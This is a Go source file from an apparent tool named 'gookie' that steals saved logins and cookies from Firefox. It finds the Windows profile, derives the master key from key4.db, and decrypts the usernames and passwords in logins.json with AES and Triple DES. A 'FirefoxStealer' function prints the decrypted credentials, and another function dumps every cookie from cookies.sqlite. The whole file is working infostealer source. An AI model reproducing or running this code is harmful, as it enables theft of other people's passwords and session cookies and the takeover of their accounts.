package browser

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"golang.org/x/crypto/pbkdf2"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"gookie/pkg/utils"
)

type Logins struct {
	NextId                           int           `json:"nextId"`
	Logins                           []Login       `json:"logins"`
	PotentiallyVulnerablePasswords   []interface{} `json:"potentiallyVulnerablePasswords"`
	DismissedBreachAlertsByLoginGUID interface{}   `json:"dismissedBreachAlertsByLoginGUID"`
	Version                          int           `json:"version"`
}

type Login struct {
	ID                  int         `json:"id"`
	Hostname            string      `json:"hostname"`
	HttpRealm           interface{} `json:"httpRealm"`
	FormSubmitURL       string      `json:"formSubmitURL"`
	UsernameField       string      `json:"usernameField"`
	PasswordField       string      `json:"passwordField"`
	EncryptedUsername   string      `json:"encryptedUsername"`
	EncryptedPassword   string      `json:"encryptedPassword"`
	Guid                string      `json:"guid"`
	EncType             int         `json:"encType"`
	TimeCreated         int         `json:"timeCreated"`
	TimeLastUsed        int         `json:"timeLastUsed"`
	TimePasswordChanged int         `json:"timePasswordChanged"`
	TimesUsed           int         `json:"timesUsed"`
}

type X struct {
	Field0 asn1.ObjectIdentifier
	Field1 []Y
}

type Y struct {
	Content asn1.RawContent
	Field0  asn1.ObjectIdentifier
}

type Y2 struct {
	Field0 asn1.ObjectIdentifier
	Field1 Z
}

type Y3 struct {
	Field0 asn1.ObjectIdentifier
	Field1 []byte
}

type Z struct {
	Field0 []byte
	Field1 int
	Field2 int
	Field3 []asn1.ObjectIdentifier
}

type EncryptedData struct {
	Field0 []byte
	Field1 EncryptedDataSeq
	Field2 []byte
}

type EncryptedDataSeq struct {
	Field0 asn1.ObjectIdentifier
	Field1 []byte
}

type Key struct {
	Field0 X
	Field1 []byte
}

type Credential struct {
	Hostname string
	Username string
	Password string
}

func loadLoginsData(profilePath string) (Logins, error) {
	var logins Logins
	jsonData, err := ioutil.ReadFile(filepath.Join(profilePath, "logins.json"))
	if err != nil {
		return logins, fmt.Errorf("failed to read file: %w", err)
	}

	if err := json.Unmarshal(jsonData, &logins); err != nil {
		return logins, fmt.Errorf("failed to unmarshal JSON: %w", err)
	}

	return logins, nil
}

func decryptAES(ciphertext, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	return plaintext, nil
}

func unpad(data []byte, blockSize int) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}

func decryptTripleDES(key []byte, iv []byte, ciphertext []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	return unpad(plaintext, 8), nil
}

func decodeLoginData(data string) ([]byte, []byte, []byte, error) {
	encrypted, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("failed to decode base64 string: %w", err)
	}

	var x EncryptedData
	if _, err := asn1.Unmarshal(encrypted, &x); err != nil {
		return nil, nil, nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
	}

	return x.Field0, x.Field1.Field1, x.Field2, nil
}

func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
	key4Path := filepath.Join(profilePath, "key4.db")

	if _, err := os.Stat(key4Path); err != nil {
		return nil, fmt.Errorf("failed to access key4.db: %w", err)
	}

	db, err := sql.Open("sqlite3", key4Path)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}
	defer db.Close()

	var globalSalt, item2 []byte
	var key Key
	var key2 Y2
	var key3 Y3

	row := db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'")
	if err := row.Scan(&globalSalt, &item2); err != nil {
		return nil, fmt.Errorf("failed to scan row: %w", err)
	}

	row = db.QueryRow("SELECT a11,a102 FROM nssPrivate;")
	var i1, i2 []byte
	if err := row.Scan(&i1, &i2); err != nil {
		return nil, fmt.Errorf("failed to scan row: %w", err)
	}

	if _, err := asn1.Unmarshal(i1, &key); err != nil {
		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
	}

	if _, err := asn1.Unmarshal(key.Field0.Field1[0].Content, &key2); err != nil {
		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
	}

	if _, err := asn1.Unmarshal(key.Field0.Field1[1].Content, &key3); err != nil {
		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
	}

	entrySalt := key2.Field1.Field0
	iterationCount := key2.Field1.Field1
	keyLength := key2.Field1.Field2

	k := sha1.Sum(globalSalt)
	respectKey := pbkdf2.Key(k[:], entrySalt, iterationCount, keyLength, sha256.New)
	iv := append([]byte{4, 14}, key3.Field1...)
	cipherT := key.Field1

	res, err := decryptAES(cipherT, respectKey, iv)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt AES: %w", err)
	}

	logins, err := loadLoginsData(profilePath)
	if err != nil {
		return nil, fmt.Errorf("failed to load logins data: %w", err)
	}

	var credentials []Credential
	for _, login := range logins.Logins {
		_, y, z, err := decodeLoginData(login.EncryptedUsername)
		if err != nil {
			return nil, fmt.Errorf("failed to decode login data: %w", err)
		}

		username, err := decryptTripleDES(res[:24], y, z)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt Triple DES: %w", err)
		}

		_, y, z, err = decodeLoginData(login.EncryptedPassword)
		if err != nil {
			return nil, fmt.Errorf("failed to decode login data: %w", err)
		}

		password, err := decryptTripleDES(res[:24], y, z)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt Triple DES: %w", err)
		}

		credentials = append(credentials, Credential{login.Hostname, string(username), string(password)})
	}

	return credentials, nil
}

func getActiveProfilePath() (string, error) {
	// Get the path of Firefox profiles folder from the APPDATA environment variable
	path := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")

	// Open the Firefox profiles folder and read its directory names
	f, err := os.Open(path)
	if err != nil {
		return "", fmt.Errorf("failed to open profiles folder: %v", err)
	}
	defer f.Close()

	dirs, err := f.Readdirnames(0)
	if err != nil {
		return "", fmt.Errorf("failed to read directory names: %v", err)
	}

	// Find the directory that contains a cookies.sqlite file which indicates the active profile
	activeDir := ""
	for _, dir := range dirs {
		if _, err := os.Stat(filepath.Join(path, dir, "cookies.sqlite")); err == nil {
			activeDir = dir
			break
		}
	}

	if activeDir == "" {
		return "", errors.New("no active profile found")
	}

	// Construct the path of the active profile directory
	path = filepath.Join(path, activeDir)

	return path, nil
}

func FirefoxStealer() {
	profilePath, err := getActiveProfilePath()
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}

	creds, err := FirefoxCrackLoginData(profilePath)
	if err != nil {
		log.Fatal(err)
	}
	for _, cred := range creds {
		fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.Hostname, cred.Username, cred.Password)
	}

}

func ReadFirefoxCookies() ([]Cookie, error) {
	profile, err := getDefaultFirefoxProfile()
	if err != nil {
		return nil, err
	}

	osUser, err := utils.GetCurrentUsername()
	if err != nil {
		return nil, err
	}

	cookiesPath := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Mozilla\\Firefox\\Profiles", profile, "cookies.sqlite")

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	query := `SELECT host as Domain, expiry as Expires, isHttpOnly as HttpOnly, 
			name as Name, path as Path, isSecure as Secure, 
			value as Value FROM moz_cookies;`
	rows, err := dbConn.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []Cookie

	for rows.Next() {
		var cookie Cookie
		var expires, httpOnly, secure int64

		err = rows.Scan(&cookie.Domain, &expires, &httpOnly, &cookie.Name,
			&cookie.Path, &secure, &cookie.Value)
		if err != nil {
			return nil, err
		}

		cookie.Expires = utils.EpochToTime(expires)
		cookie.HttpOnly = utils.IntToBool(httpOnly)
		cookie.IsSecure = utils.IntToBool(secure)

		cookies = append(cookies, cookie)
	}
	return cookies, nil
}

func getDefaultFirefoxProfile() (string, error) {
	osUser, err := utils.GetCurrentUsername()
	if err != nil {
		return "", err
	}

	profilesDir := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
	profileFiles, err := os.ReadDir(profilesDir)
	if err != nil {
		return "", err
	}

	for _, profile := range profileFiles {
		if !profile.IsDir() || !strings.Contains(profile.Name(), ".default") {
			continue
		}

		currentProfile, err := os.ReadDir(filepath.Join(profilesDir, profile.Name()))
		if err != nil {
			return "", err
		}

		for _, file := range currentProfile {
			if file.Name() != "cookies.sqlite" {
				continue
			}

			return profile.Name(), nil
		}
	}

	return "", errors.New("could not find default profile")
}
